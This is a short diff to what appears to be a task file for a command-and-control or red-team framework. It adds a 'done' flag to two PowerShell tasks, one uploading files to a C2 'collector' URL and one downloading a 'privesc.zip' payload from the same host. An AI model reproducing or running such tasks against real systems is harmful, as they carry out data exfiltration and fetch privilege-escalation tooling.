@@ -5,6 +5,7 @@
         "clock": "",
         "module": "powershell",
         "method": "upload_file",
+        "done" : false,
         "options": [
             [
                 "https://c2.com/collector",
@@ -22,6 +23,7 @@
         "clock": "",
         "module": "powershell",
         "method": "download_file",
+        "done" : false,
         "options": [
             [
                 "https://c2.com/privesc.zip",
